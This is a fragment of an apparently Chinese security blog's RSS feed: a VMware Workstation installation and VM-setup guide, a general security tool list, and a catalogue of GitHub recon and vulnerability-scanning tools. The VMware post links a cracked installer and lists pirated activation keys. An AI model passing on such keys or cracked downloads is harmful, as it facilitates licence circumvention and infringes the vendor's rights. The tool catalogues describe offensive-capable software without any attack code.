&lt;p&gt;各自虚拟化服务软件间其实大同小异，所以这里就只关注 Vmware Workstation 的安装&lt;/p&gt;
&lt;h2 id=&#34;vmware安装包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vmware安装包&#34;&gt;#&lt;/a&gt; VMware 安装包&lt;/h2&gt;
&lt;p&gt;在之前 VMware 还是免费的，但后来就开始收费购买使用，现在适用于桌面级的有三种版本：&lt;/p&gt;
&lt;p&gt;VMware Fusion（for mac）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudm13YXJlLmNvbS9wcm9kdWN0cy9mdXNpb24uaHRtbA==&#34;&gt;https://www.vmware.com/products/fusion.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;VMware Workstation Player（free for Windows and Linux）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudm13YXJlLmNvbS9wcm9kdWN0cy93b3Jrc3RhdGlvbi1wbGF5ZXIuaHRtbA==&#34;&gt;https://www.vmware.com/products/workstation-player.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;VMware Workstation Pro（for Windows and Linux）：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudm13YXJlLmNvbS9wcm9kdWN0cy93b3Jrc3RhdGlvbi1wcm8uaHRtbA==&#34;&gt;https://www.vmware.com/products/workstation-pro.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这里也贴一个 workstation pro 15.5 的破解安装包：链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXB3WlFvcEJVM0tCWlRVaU9hSEwxSGc=&#34;&gt;https://pan.baidu.com/s/1pwZQopBU3KBZTUiOaHL1Hg&lt;/span&gt;  提取码: 1919&lt;/p&gt;
&lt;h2 id=&#34;安装过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装过程&#34;&gt;#&lt;/a&gt; 安装过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;双击运行安装 exe&lt;/li&gt;
&lt;li&gt;接受条款，下一步&lt;/li&gt;
&lt;li&gt;选择安装目录，建议不要安装在 C 盘上，选项全部勾选&lt;/li&gt;
&lt;li&gt;“检查更新” 和 “加入体验计划” 选项视情况而定，可选可不选&lt;/li&gt;
&lt;li&gt;勾选创建快捷方式&lt;/li&gt;
&lt;li&gt;下一步至安装，并等待安装完成&lt;/li&gt;
&lt;li&gt;安装完成后双击快捷方式打开&lt;/li&gt;
&lt;li&gt;此时会要求你输入激活码，可以选择试用，也可以上网百度一下激活码，有的可以用，多试一试，这里贴几个网络上的 workstation pro 15.5 的激活码&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;VG5HH-D6E04-0889Y-QXZET-QGUC8
CY55A-F6G80-H85HQ-WNN5X-W38W4
AC11H-4HZ05-08EDQ-APQGX-YCUC8
ZG780-8EZ9M-M89LY-M5PEG-W2AZ8
AU15R-A0Z4N-M88HY-HQYNX-QYKD6
VY110-4RD50-H886P-5FMN9-WPUUD
GF302-4HW44-H88DQ-WZXNV-Q3R94
UA752-0KF9J-0811Y-MQNEX-ZUAGF
ZF3NU-D6XEJ-48E7Q-27YNC-PC8ED
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;9&#34;&gt;
&lt;li&gt;激活成功进入首页即可完成安装&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;虚拟机的搭建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#虚拟机的搭建&#34;&gt;#&lt;/a&gt; 虚拟机的搭建&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;首先必须要下载好你想要安装的虚拟机的操作系统镜像，比如 Windows、Ubuntu 等，当然也会有有的操作系统已经帮你安装好虚拟机上打包好了的，比如 Kali。这里放两个示例镜像的连接&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;Windows 10：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS96aC1jbi9zb2Z0d2FyZS1kb3dubG9hZC93aW5kb3dzMTA=&#34;&gt;https://www.microsoft.com/zh-cn/software-download/windows10&lt;/span&gt; （进入后点击 “立即下载工具” 即可，当然这个也需要激活才能使用全部功能，但实际上不激活也不影响正常使用）&lt;/p&gt;
&lt;p&gt;Ubuntu：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly91YnVudHUuY29tL2Rvd25sb2FkL2Rlc2t0b3A=&#34;&gt;https://ubuntu.com/download/desktop&lt;/span&gt; （进入点击 “download” 即可）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;打开虚拟机，点击 “创建虚拟机”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通常建议新手接下来选择 “典型” 配置，这样配置设置要简单一点，当然也可以选择 “自定义”，这样要选择的设置就多一点。 &lt;span class=&#34;spoiler&#34; title=&#34;你知道的太多了&#34;&gt;其实两种配置本质上没有多大区别，以后用的多了完全可以再修改虚拟机的设置，修改资源分配&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这里为了展示得更全面，选择 “自定义” 配置，在硬件兼容性上通常选择与当前虚拟机软件版本一致的选项，例如当前为 workstation pro 16，兼容性就选择 workstation 16.x&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;选择 “安装程序光盘映像文件”，然后浏览选择你下载好的系统镜像，下一步&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;命名请随意，位置建议不要放在 C 盘&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;处理器配置可默认，当然安装后也可以修改&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;虚拟机内存可用推荐设置，当然安装后也可以修改&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网络连接通常使用 NAT，如果使用环境不限制入网设备数量可以使用桥接模式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;随后一路使用默认设置一路 “下一步” 即可，在指定磁盘容量时建议先预设好自己所安装的虚拟机要用来做什么，会安装什么软件，然后设置好适当大小的最大磁盘大小，同时选择将虚拟磁盘拆分为多个文件，因为如果后期容量不足增加容量后，打开虚拟机进行磁盘分配的操作较为麻烦（其实和物理机上加装硬盘然后分区的操作大同小异，只是同样麻烦）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;随后就是正常的系统安装过程，这部分就不再赘述，根据个人需求选择安装选项即可&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/tools-1/</guid>
            <title>工具集（长期更新……大概？）</title>
            <link>https://mobius-0.github.io/security/tools-1/</link>
            <category>网络安全</category>
            <category>工具</category>
            <pubDate>Wed, 16 Nov 2022 19:28:43 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 工具&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Burp suite&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;渗透测试中常见的工具，基于 java 编写，尽管只有社区版免费，但功能依旧强大&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Wireshark&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;实用的网络抓包分析软件&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;WinHex&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;常用的十六进制分析工具，可用于检查和修复文件，也可以用来隐藏和复现某些信息&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;masscan&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款开源的跨平台的端口扫描工具，速度较快，但漏报相应较多，通常在内网中使用&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;nmap&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款开放源代码的网络探测和安全审核工具，设计目标是快速地扫描大型网络 &lt;span class=&#34;spoiler&#34; title=&#34;你知道的太多了&#34;&gt;但是通常都很慢&lt;/span&gt; 。除了端口扫描还可以对扫描目标的网络状态等进行判断，所以通常被用来做安全审查&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;sqlmap&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款开源的渗透测试工具，可用于自动检测和利用 SQL 注入漏洞&lt;/p&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;VirtualBox&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;开源的虚拟机软件，可用于在 Windows 或 Linux 主机上安装运行各类系统的虚拟机&lt;/p&gt;
&lt;ol start=&#34;8&#34;&gt;
&lt;li&gt;VMware Workstation&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;业界知名的虚拟机软件，用户可在同一主机运行多台虚拟机进行各项测试&lt;/p&gt;
&lt;ol start=&#34;9&#34;&gt;
&lt;li&gt;Adobe Photoshop&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;常用的图像处理软件&lt;/p&gt;
&lt;ol start=&#34;10&#34;&gt;
&lt;li&gt;Adobe Audition&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;常用的音频处理软件&lt;/p&gt;
&lt;ol start=&#34;11&#34;&gt;
&lt;li&gt;AntSword&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款开源的跨平台网站管理工具&lt;/p&gt;
&lt;ol start=&#34;12&#34;&gt;
&lt;li&gt;IDA Pro&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款功能丰富的跨平台多处理器反汇编程序和调试器&lt;/p&gt;
&lt;ol start=&#34;13&#34;&gt;
&lt;li&gt;Elcomsoft Forensic Disk Decryptor&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;实时解密 BitLocker、PGP 以及 TrueCrypt 加密磁盘，可完全解密所有的文件或实时解密文件，用户可以选择解密所有文件并访问或者实时解密文件。&lt;/p&gt;
&lt;ol start=&#34;14&#34;&gt;
&lt;li&gt;Elcomsoft Wireless Security Auditor&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款审核无线网络 Wi-Fi 的安全性，检查无线网络和信道的工具，可用于嗅探无线流量并破解 WPA/WPA2 密码&lt;/p&gt;
&lt;ol start=&#34;15&#34;&gt;
&lt;li&gt;Advanced Archive Password Recovery&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款破解 ZIP 和 RAR 文件的密码工具，完美底层优化有助于更快地完成工作，能够保证在一小时之内恢复特定类型的压缩文件&lt;/p&gt;
&lt;ol start=&#34;16&#34;&gt;
&lt;li&gt;Notepad++&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;功能强大的记事本 max pro plus（bushi）&lt;/p&gt;
&lt;h1 id=&#34;浏览器插件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#浏览器插件&#34;&gt;#&lt;/a&gt; 浏览器插件&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Tamermonkey&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;实用的用户脚本管理器，可兼容 Firefox、Edge、chrome、Opera、Safari 等浏览器&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Wappalyzer&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款信息收集插件，可方便地查看当前站点的服务器型号、版本、服务器端语言等信息&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Shodan&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Shodan 插件能够告诉你网站在哪里托管 (国家，城市) ，谁拥有 IP 和其他服务 / 端口是开放的。&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;FoxyProxy&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Firefox 浏览器上的一款代理管理工具&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Proxy SwitchyOmega&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款代理管理插件，可轻松快捷地管理和切换多个代理设置&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;HackBar&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Firefox 浏览器上的一款网站 URL 渗透工具&lt;/p&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;Flagfox&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Firefox 浏览器上的一款显示当前服务器位置国旗的插件&lt;/p&gt;
&lt;h1 id=&#34;搜索引擎&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搜索引擎&#34;&gt;#&lt;/a&gt; 搜索引擎&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;fofa&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9mb2ZhLmluZm8v&#34;&gt;FOFA&lt;/span&gt; 是白帽汇推出的一款网络空间资产搜索引擎。它能够帮助用户迅速进行网络资产匹配、加快后续工作进程。例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Zoomeye&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuem9vbWV5ZS5vcmcv&#34;&gt;ZoomEye&lt;/span&gt;（“钟馗之眼”）—— 全球网络空间测绘的领导者，是知道创宇旗下 404 实验室驱动打造的中国第一款，同时也是全球著名的网络空间搜索引擎。通过分布在全球的大量测绘节点，针对全球范围内的 IPv4、IPv6 地址库及网站域名库进行 24 小时不间断探测、识别，根据对多个服务端口协议进行测绘，最终实现对整体或局部地区的网络空间画像。&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;shodan&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cvc2hvZGFuLmlvLw==&#34;&gt;shodan&lt;/span&gt; 世界上第一个互联网连接设备的搜索引擎，也是世界有名的网络空间搜索引擎&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;360quake&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9xdWFrZS4zNjAubmV0L3F1YWtlLyMvaW5kZXg=&#34;&gt;360 QUAKE Vscan&lt;/span&gt; 是 360 开发的一款网络空间测绘引擎，Quake 网络空间测绘系统是 360 安全大脑 - 测绘云的核心系统，持续性探测全球 IPv4、IPv6 地址，做到实时感知全球网络空间中各类资产并发现其安全风险&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/tools/</guid>
            <title>渗透测试工具收集</title>
            <link>https://mobius-0.github.io/security/tools/</link>
            <category>网络安全</category>
            <category>工具</category>
            <pubDate>Wed, 16 Nov 2022 19:28:43 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h1&gt;
&lt;h2 id=&#34;综合工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#综合工具&#34;&gt;#&lt;/a&gt; 综合工具&lt;/h2&gt;
&lt;h3 id=&#34;sitescan&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sitescan&#34;&gt;#&lt;/a&gt; SiteScan&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;专注一站式解决渗透测试的信息收集任务。包括域名 ip 历史解析、nmap 常见端口爆破、子域名信息收集、旁站信息收集、whois 信息收集、网站架构分析、cms 解析、备案号信息收集、CDN 信息解析、是否存在 waf 检测、后台寻找以及生成检测结果 html 报告表等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tyYWNlcjEyNy9TaXRlU2Nhbg==&#34;&gt;https://github.com/kracer127/SiteScan&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;nemo_go&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nemo_go&#34;&gt;#&lt;/a&gt; nemo_go&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Nemo 是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率，用 Golang 完全重构了原 Python 版本。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hhbmMwMGwvbmVtb19nbw==&#34;&gt;https://github.com/hanc00l/nemo_go&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;linglong&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linglong&#34;&gt;#&lt;/a&gt; linglong&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款资产巡航扫描系统。系统定位是通过 masscan+nmap 无限循环去发现新增资产，自动进行端口弱口令爆破 /、指纹识别、XrayPoc 扫描。主要功能包括:  &lt;code&gt;资产探测&lt;/code&gt; 、 &lt;code&gt;端口爆破&lt;/code&gt; 、 &lt;code&gt;Poc扫描&lt;/code&gt; 、 &lt;code&gt;指纹识别&lt;/code&gt; 、 &lt;code&gt;定时任务&lt;/code&gt; 、 &lt;code&gt;管理后台识别&lt;/code&gt; 、 &lt;code&gt;报表展示&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2F3YWtlMXQvbGluZ2xvbmc=&#34;&gt;https://github.com/awake1t/linglong&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;appinfoscanner&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#appinfoscanner&#34;&gt;#&lt;/a&gt; AppInfoScanner&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款适用于以 HW 行动 / 红队 / 渗透测试团队为场景的移动端 (Android、iOS、WEB、H5、静态网站) 信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态 WEB 站点中关键的资产信息并提供基本的信息输出，如：Title、Domain、CDN、指纹信息、状态信息等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tlbHZpbkJlbi9BcHBJbmZvU2Nhbm5lcg==&#34;&gt;https://github.com/kelvinBen/AppInfoScanner&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;banli-资产扫描工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#banli-资产扫描工具&#34;&gt;#&lt;/a&gt; Banli - 资产扫描工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Banli 是一款极其简单好用的高危资产识别和高危漏洞扫描工具。Banli 要解决的问题是如何快速识别企业的高危资产，如何快速扫描企业的高危漏洞。包括 Web 资产、中间件资产、框架资产、安全设备等高危资产的识别，包括 Web 漏洞、命令执行漏洞、反序列化等高危漏洞的扫描.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0dvcWkvQmFubGk=&#34;&gt;https://github.com/Goqi/Banli&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;uture_box&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#uture_box&#34;&gt;#&lt;/a&gt; uture_Box&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;集合渗透测试常用工具对目标进行一键扫描。包含多个 github 优秀的开源工具，只需传入目标，即可启动收集的工具同时对目标进行扫描，将结果统一格式化输出。现有两个模块的工具：collect（信息收集）与 vulscan（漏洞扫描）包含功能：目录扫描、子域名爆破、指纹识别、Cms 识别、Waf 识别、Js 检测 url、漏洞扫描&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0Y2Sk8vU3V0dXJlX0JveA==&#34;&gt;https://github.com/F6JO/Suture_Box&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;ip2domain&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ip2domain&#34;&gt;#&lt;/a&gt; ip2domain&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;批量查询 ip 对应域名、备案信息、百度权重。在批量挖 SRC 时，通常会用较新的漏洞 POC 批量跑 fofa 或其他空间测绘的相关资产 ip，该工具可用于对跑到的 ip 批量查询域名及百度权重、备案信息，快速确定 ip 所属企业，方便提交漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NtYTExTmV3L2lwMmRvbWFpbg==&#34;&gt;https://github.com/Sma11New/ip2domain&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;enscan&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#enscan&#34;&gt;#&lt;/a&gt; ENScan&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;企业基本信息（法人、电话、公司地址等等）* 企业 ICP 备案号以及网站企业 APP 信息企业微信公众号信息企业微博信息子公司的基本信息供应商信息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3dncHNlYy9FTlNjYW4=&#34;&gt;https://github.com/wgpsec/ENScan&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;yakit&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#yakit&#34;&gt;#&lt;/a&gt; YAKIT&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;YAK 是国际上首个致力于网络安全底层能力融合的垂直开发语言，提供了非常强大的安全能力。Yak 是绝大部分 “数据描述语言 / 容器语言” 的超集，具备 Go 所有能力与库生态，VSCode 插件等，语法可自定义，是图灵完备的脚本语言，完全国产。通过函数提供各类底层安全能力，包括端口扫描、指纹识别、poc 框架、shell 管理、MITM 劫持、强大的插件系统等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3lha2xhbmcveWFraXQ=&#34;&gt;https://github.com/yaklang/yakit&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;水泽-信息收集自动化工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#水泽-信息收集自动化工具&#34;&gt;#&lt;/a&gt; 水泽 - 信息收集自动化工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;协助红队人员快速的信息收集，测绘目标资产，寻找薄弱点。一条龙服务，只需要输入根域名即可全方位收集相关资产，并检测漏洞。也可以输入多个域名、C 段 IP 等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzB4NzI3L1NodWlaZV8weDcyNw==&#34;&gt;https://github.com/0x727/ShuiZe_0x727&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;goscan&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#goscan&#34;&gt;#&lt;/a&gt; GoScan&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;GoScan 是采用 Golang 语言编写的一款分布式综合资产管理系统，Web 端负责展示数据和接受输入，Client 端负责任务运行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NURi1NaXNzRmVuZy9Hb1NjYW4=&#34;&gt;https://github.com/CTF-MissFeng/GoScan&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;szhe_scan&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#szhe_scan&#34;&gt;#&lt;/a&gt; SZhe_Scan&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;碎遮 SZhe_Scan Web 漏洞扫描器，基于 python Flask 框架，对输入的域名 / IP 进行全面的信息搜集，漏洞扫描，可自主添加 POC&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NsMHVkRzBkL1NaaGVfU2Nhbg==&#34;&gt;https://github.com/Cl0udG0d/SZhe_Scan&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;raccoon&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#raccoon&#34;&gt;#&lt;/a&gt; Raccoon&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款用于侦察和漏洞扫描的高性能攻击性安全工具。从获取 DNS 记录，TLS 数据，WHOIS 信息检索，WAF 存在检测以及目录爆破，子域枚举等所有操作。每次扫描结果都将会输出保存到相应的文件中&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2V2eWF0YXJtZWdlZC9SYWNjb29u&#34;&gt;https://github.com/evyatarmeged/Raccoon&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;scannn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#scannn&#34;&gt;#&lt;/a&gt; Scannn&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款红队辅助扫描工具，针对多端口多 IP 的端口扫描与特征分析程序&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1hpYW9CYWktMTIxMzgvU0NBTk5O&#34;&gt;https://github.com/XiaoBai-12138/SCANNN&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;tsunami&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tsunami&#34;&gt;#&lt;/a&gt; Tsunami&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Tsunami 是一款功能强大的通用网络安全扫描工具，除此之外，它还是一个可扩展的插件系统，可以帮助广大安全研究人员以高可信度的方式检测和扫描高危严重漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS90c3VuYW1pLXNlY3VyaXR5LXNjYW5uZXI=&#34;&gt;https://github.com/google/tsunami-security-scanner&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;ratel&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ratel&#34;&gt;#&lt;/a&gt; ratel&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;ratel (獾) 是一个由 rust 开发的信息搜集工具，专注 web 资产发现，支持从 fofa，zoomeye API 查询，提供详细的配置参数，可靠，可以从错误中恢复查询，自动去重。同时也支持主动扫描端口，探测 http，提取 https 证书中域名。ratel 提供细粒度的 http poc 探测模块，支持多请求的 poc，利用自定义正则表达式提取响应内容并作为后续请求的变量。ratel 输出格式为 csv。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2g0Y251bGwvcmF0ZWw=&#34;&gt;https://github.com/h4cnull/ratel&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;onlinetools-线上信息收集工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#onlinetools-线上信息收集工具&#34;&gt;#&lt;/a&gt; onlinetools - 线上信息收集工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;这是一款线上工具箱，收集整理了一些渗透测试过程中常见的需求（病句？）&lt;br /&gt;
现在已经包含的功能有：&lt;br /&gt;
在线 cms 识别 | 信息泄露 | 工控 | 系统 | 物联网安全 | cms 漏洞扫描 | nmap 端口扫描 | 子域名获取&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ljZXloZXhtYW4vb25saW5ldG9vbHM=&#34;&gt;https://github.com/iceyhexman/onlinetools&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;jud-scan&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jud-scan&#34;&gt;#&lt;/a&gt; JuD-Scan&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;JuD-Scan 定位是一个资产发现和识别工具；其特色功能在于快速识别 Web 指纹信息，定位资产类型。辅助红队快速定位目标资产信息。&lt;/p&gt;
&lt;/blockquote&gt;
